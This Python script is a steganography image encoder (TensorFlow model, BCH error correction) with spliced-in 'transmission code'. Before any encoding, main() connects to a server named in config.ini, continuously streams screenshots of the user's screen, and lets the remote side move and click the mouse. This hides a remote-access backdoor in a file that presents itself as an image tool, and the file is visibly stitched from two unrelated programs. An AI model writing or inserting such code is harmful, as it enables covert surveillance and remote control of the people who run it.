import bchlib
import glob
import os
from PIL import Image,ImageOps
import numpy as np
import tensorflow as tf
import tensorflow.contrib.image
from tensorflow.python.saved_model import tag_constants
from tensorflow.python.saved_model import signature_constants
import time

from PIL import ImageGrab
from pynput.mouse import Controller, Button
from configparser import RawConfigParser
import numpy as np
import socket
import sys
import cv2
import struct
import json
import hashlib
import win32api
import win32con
import threading
resolution = (win32api.GetSystemMetrics(win32con.SM_CXSCREEN), win32api.GetSystemMetrics(win32con.SM_CYSCREEN))
resize = (400, 400)
#以下为传输代码
class MyConfigParser(RawConfigParser):
    def __init__(self, defaults=None):
        RawConfigParser.__init__(self, defaults=defaults)

    def optionxform(self, option_str):
        return option_str


def socket_client(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print(s.recv(1024).decode())
    except socket.error as e:
        print(e)
        sys.exit(1)

    resize_ratio = (resolution[0]/resize[0], resolution[1]/resize[1])

    base_info = {
        'resize_ratio': resize_ratio
    }
    s.send(json.dumps(base_info).encode())
    while True:
        response = s.recv(1024)
        if response.decode() == "client info confirm":
            break

    receive_thread = threading.Thread(target=receive_mouse_msg, args=(s, ))
    receive_thread.start()
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 95]
    while True:
        flag, msg = make_screen_img(encode_param)
        if not flag:
            break
        flag = send_msg(s, msg)
        if not flag:
            break
        time.sleep(0.01)
    s.close()

def make_screen_img(encode_param):
    try:
        screen = ImageGrab.grab()
        bgr_img = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)  # 颜色空间转换, cv2.COLOR_RGB2BGR 将RGB格式转换成BGR格式
        img = cv2.resize(bgr_img, resize)  # 缩放图片
        return True, cv2.imencode(".jpg", img, encode_param)[1].tostring()  # 把当前图片img按照jpg格式编码
    except Exception as e:
        print(e)
        return False, None


def get_msg_info(msg):
    return len(msg), hashlib.md5(msg).hexdigest()


def make_msg_header(msg_length, msg_md5):
    header = {
        'msg_length': msg_length,
        'msg_md5': msg_md5
    }
    return json.dumps(header).encode()

def send_msg(conn, msg):
    msg_length, msg_md5 = get_msg_info(msg)
    msg_header = make_msg_header(msg_length, msg_md5)
    msg_header_length = struct.pack('i', len(msg_header))
    try:
        header_len_res = conn.send(msg_header_length)
        header_res = conn.send(msg_header)
        msg_res = conn.sendall(msg)
        return True
    except socket.error as e:
        print(e)
        return False


def receive_mouse_msg(conn, ):
    mouse = Controller()
    while True:
        try:
            msg_length = struct.unpack('i', conn.recv(4))[0]
            mouse_msg = json.loads(conn.recv(msg_length).decode())
            mouse_position = mouse_msg.get('mouse_position')
            event = mouse_msg.get('event')
            flags = mouse_msg.get('flags')
            mouse_event(mouse, mouse_position[0], mouse_position[1], event, flags)
            print(mouse_position[0], mouse_position[1], event, flags)

        except Exception as e:
            print(e)
            break
    conn.close()

def mouse_event(mouse, x, y, event, flags):
    flag_event = get_flag_event(flags)
    mouse.position = (x, y)
    # 鼠标左键
    if event == cv2.EVENT_LBUTTONDOWN:
        mouse.press(Button.left)
    elif event == cv2.EVENT_LBUTTONUP:
        mouse.release(Button.left)
    elif event == cv2.EVENT_LBUTTONDBLCLK:
        mouse.click(Button.left, 2)
    # 鼠标中键
    elif event == cv2.EVENT_MBUTTONDOWN:
        mouse.press(Button.middle)
    elif event == cv2.EVENT_MBUTTONUP:
        mouse.release(Button.middle)
    elif event == cv2.EVENT_MBUTTONDBLCLK:
        mouse.click(Button.middle, 2)
    # 鼠标右键
    elif event == cv2.EVENT_RBUTTONDOWN:
        mouse.press(Button.right)
    elif event == cv2.EVENT_RBUTTONUP:
        mouse.release(Button.right)
    elif event == cv2.EVENT_RBUTTONDBLCLK:
        mouse.click(Button.right, 2)


def get_flag_event(value):
    flags = [
        cv2.EVENT_FLAG_LBUTTON, # 1
        cv2.EVENT_FLAG_RBUTTON, # 2
        cv2.EVENT_FLAG_MBUTTON, # 4
        cv2.EVENT_FLAG_CTRLKEY, # 8
        cv2.EVENT_FLAG_SHIFTKEY, # 16
        cv2.EVENT_FLAG_ALTKEY, # 32
    ]
    flag_events = []
    for flag in sorted(flags, reverse=True):
        if value >= flag:
            flag_events.append(flag)
            value -= flag
    return flag_events
# 传输代码止

BCH_POLYNOMIAL = 137
BCH_BITS = 5

def main():
    # 传输代码
    config = MyConfigParser()
    config.read('config.ini', encoding='utf-8')
    server_host = config.get('Server', 'host')
    server_port = config.getint('Server', 'port')
    socket_client(server_host, server_port)
    # 传输代码止

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('model', type=str)
    parser.add_argument('--image', type=str, default=None)
    parser.add_argument('--images_dir', type=str, default=None)
    parser.add_argument('--save_dir', type=str, default=None)
    parser.add_argument('--secret', type=str, default='Stega!!')
    args = parser.parse_args()

    if args.image is not None:
        files_list = [args.image]
    elif args.images_dir is not None:
        files_list = glob.glob(args.images_dir + '/*')
    else:
        print('Missing input image')
        return

    sess = tf.InteractiveSession(graph=tf.Graph())

    model = tf.saved_model.loader.load(sess, [tag_constants.SERVING], args.model)

    input_secret_name = model.signature_def[signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY].inputs['secret'].name
    input_image_name = model.signature_def[signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY].inputs['image'].name
    input_secret = tf.get_default_graph().get_tensor_by_name(input_secret_name)
    input_image = tf.get_default_graph().get_tensor_by_name(input_image_name)

    output_stegastamp_name = model.signature_def[signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY].outputs['stegastamp'].name
    output_residual_name = model.signature_def[signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY].outputs['residual'].name
    output_stegastamp = tf.get_default_graph().get_tensor_by_name(output_stegastamp_name)
    output_residual = tf.get_default_graph().get_tensor_by_name(output_residual_name)

    width = 400
    height = 400

    bch = bchlib.BCH(BCH_POLYNOMIAL, BCH_BITS)

    if len(args.secret) > 7:
        print('Error: Can only encode 56bits (7 characters) with ECC')
        return

    data = bytearray(args.secret + ' '*(7-len(args.secret)), 'utf-8')
    ecc = bch.encode(data)
    packet = data + ecc

    packet_binary = ''.join(format(x, '08b') for x in packet)
    secret = [int(x) for x in packet_binary]
    secret.extend([0,0,0,0])

    if args.save_dir is not None:
        if not os.path.exists(args.save_dir):
            os.makedirs(args.save_dir)
        size = (width, height)
        for filename in files_list:
            image = Image.open(filename).convert("RGB")
            image = np.array(ImageOps.fit(image,size),dtype=np.float32)
            image /= 255.

            feed_dict = {input_secret:[secret],
                         input_image:[image]}

            hidden_img, residual = sess.run([output_stegastamp, output_residual],feed_dict=feed_dict)

            rescaled = (hidden_img[0] * 255).astype(np.uint8)
            raw_img = (image * 255).astype(np.uint8)
            residual = residual[0]+.5

            residual = (residual * 255).astype(np.uint8)

            save_name = filename.split('/')[-1].split('.')[0]

            im = Image.fromarray(np.array(rescaled))
            im.save(args.save_dir + '/'+save_name+'_hidden.png')

            im = Image.fromarray(np.squeeze(np.array(residual)))
            im.save(args.save_dir + '/'+save_name+'_residual.png')

if __name__ == "__main__":
    main()
